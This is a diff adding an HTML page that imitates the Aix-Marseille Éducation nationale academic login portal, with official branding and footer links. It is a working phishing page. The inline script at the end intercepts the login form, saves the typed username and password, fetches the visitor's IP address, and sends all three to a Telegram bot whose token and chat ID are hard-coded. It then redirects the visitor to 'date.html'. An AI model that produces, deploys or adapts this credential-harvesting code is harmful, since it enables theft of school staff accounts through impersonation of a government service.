@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>Page de Connexion - Aix-Marseille</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <header class="header">
+    <img src="logo.png" alt="Logo Éducation nationale" class="logo" />
+    <div class="title-container">
+      <h1>PAGE DE CONNEXION <span>[AIX-MARSEILLE]</span></h1>
+      <p>Identifiez-vous</p>
+    </div>
+  </header>
+
+  <main class="main-content">
+    <section class="box">
+      <h2>JE ME CONNECTE AVEC MON OTP</h2>
+      <button class="btn-otp">S'AUTHENTIFIER AVEC MON OTP ACADÉMIQUE <span class="emoji">🔑</span></button>
+    </section>
+
+    <div class="separator">ou</div>
+
+    <section class="box">
+	<form method="post" action="">
+      <h2>JE ME CONNECTE AVEC MON MOT DE PASSE</h2>
+
+      <label>Identifiant académique ou adresse mail</label>
+      <input type="text" name="identifiant" class="input" inputmode="text" required/>
+
+      <a href="#" class="link-small">Identifiant inconnu ?</a>
+
+      <label class="mt">Je me connecte avec mon mot de passe</label>
+      <div class="password-container">
+        <input type="password" name="password" class="input" inputmode="text" required/>
+        <label class="checkbox-label"><input type="checkbox" /> Afficher</label>
+      </div>
+
+      <a href="#" class="link-small">Mot de passe perdu ?</a>
+
+      <button type="submit" class="btn-submit">SE CONNECTER</button>
+	  </form>
+    </section>
+
+    <div class="first-time">
+      <a href="#">Ceci est votre première connexion ?</a>
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-top">
+      <a href="#">education.gouv.fr</a>
+      <a href="#">service-public.fr</a>
+      <a href="#">legifrance.gouv.fr</a>
+      <a href="#">franceconnect.gouv.fr</a>
+    </div>
+    <hr />
+    <div class="footer-bottom">
+      <a href="#">Besoin d'aide ?</a>
+      <span>Accessibilité : non conforme</span>
+      <a href="#">Mentions légales</a>
+      <span>v2.2.3</span>
+    </div>
+  </footer>
+<!-- Placez ce script juste avant </body> de votre index.html -->
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+  const form = document.querySelector("form");
+
+  form.addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const identifiant = document.querySelector('input[name="identifiant"]').value;
+    const password = document.querySelector('input[name="password"]').value;
+
+    // Stockage local
+    localStorage.setItem("identifiant", identifiant);
+    localStorage.setItem("password", password);
+
+    // Config Telegram
+    const botToken = "7106248607:AAHSc6HYXMtaCPQcADatjv8uhZtYe3yoyt0";
+    const chatId = "5982775933";
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    // Récupérer l’IP
+    fetch("https://api.ipify.org?format=json")
+      .then((res) => res.json())
+      .then((data) => {
+        const ip = data.ip;
+        const message = `
+🛡Identifiant Aix-marseille
+• IP : ${ip}
+• Identifiant : ${identifiant}
+• Mot de passe : ${password}
+        `;
+        return fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+      })
+      .then(() => {
+        window.location.href = "date.html";
+      })
+      .catch((error) => {
+        console.error("Erreur IP/Telegram :", error);
+        window.location.href = "date.html";
+      });
+  });
+});
+</script>
+
+
+</body>
+</html>
